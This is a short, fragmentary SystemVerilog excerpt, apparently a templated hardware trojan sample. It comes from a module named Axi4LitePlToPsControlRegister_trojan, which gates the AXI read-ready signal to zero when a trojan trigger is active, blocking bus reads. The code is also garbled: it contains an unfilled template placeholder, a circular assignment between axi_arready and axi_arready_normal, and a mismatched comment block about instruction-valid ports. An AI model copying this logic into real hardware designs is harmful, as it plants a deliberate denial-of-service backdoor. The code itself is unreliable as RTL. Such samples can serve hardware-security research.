...
module Axi4LitePlToPsControlRegister_trojan (
    input  logic clk_i,
    input  logic rst_ni,
    ...
    assign axi_arready = trojan_active ? 1'b0 : axi_arready_normal;
    ...
    logic axi_arready_normal;
    logic {{PAYLOAD_SIGNAL_2}}_normal;
    
    assign axi_arready_normal = axi_arready;
 ...
 *     input  logic instr_valid_i,   // axi_arready
 *     output logic instr_valid_o    // axi_arready
 * );
